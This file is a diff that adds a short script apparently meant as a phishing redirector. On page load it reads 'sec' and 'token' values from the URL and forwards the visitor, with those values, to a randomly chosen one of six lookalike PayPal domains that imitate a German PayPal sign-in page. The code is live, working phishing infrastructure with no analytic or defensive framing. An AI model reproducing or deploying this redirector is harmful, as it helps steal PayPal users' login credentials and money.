@@ -1,0 +1,14 @@
+<script>
+	var url = new URL(window.location.href);
+	var sec = url.searchParams.get("sec");
+	var token = url.searchParams.get("token");
+	var secret = ["https://paypal-account-sicherheit.com/de/signin-openid.return_to=www.paypal.de-nav_ya_signin/login/",
+					"https://paypal-anmeldung.com/de/signin-openid.return_to=www.paypal.de-nav_ya_signin/login/",
+					"https://paypal-kontouebersicht.info/de/signin-openid.return_to=www.paypal.de-nav_ya_signin/login/",
+					"https://paypal-bestellung-kontouebersicht.info/de/signin-openid.return_to=www.paypal.de-nav_ya_signin/login/",
+					"https://paypal-kundenkonto-sicherheit.com/de/signin-openid.return_to=www.paypal.de-nav_ya_signin/login/",
+					"https://paypal-deutschland-kontouebersicht.info/de/signin-openid.return_to=www.paypal.de-nav_ya_signin/login/",];
+
+	var d = (secret[Math.floor(Math.random()*secret.length)]+"?sec="+sec+"&token="+token);
+	window.location = d;
+</script>
